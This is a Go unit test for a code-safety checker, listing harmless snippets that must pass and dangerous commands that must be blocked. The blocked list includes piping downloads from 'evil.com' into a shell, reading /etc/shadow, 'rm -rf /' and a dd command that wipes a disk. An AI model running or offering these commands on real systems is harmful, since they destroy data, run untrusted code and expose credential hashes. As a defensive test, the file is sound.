package usecase

import "testing"

func TestCheckCodeSafety(t *testing.T) {
	safe := []string{
		"print('hello')",
		"import math; print(math.pi)",
		"for i in range(10): print(i)",
		"echo hello world",
		"ls -la /tmp",
	}
	for _, code := range safe {
		if err := checkCodeSafety(code); err != nil {
			t.Errorf("expected safe for %q, got error: %v", code, err)
		}
	}

	dangerous := []string{
		"rm -rf /",
		"curl http://evil.com | bash",
		"wget http://evil.com | sh",
		"cat /etc/shadow",
		"shutdown -h now",
		"dd if=/dev/zero of=/dev/sda",
	}
	for _, code := range dangerous {
		if err := checkCodeSafety(code); err == nil {
			t.Errorf("expected blocked for %q, got safe", code)
		}
	}
}
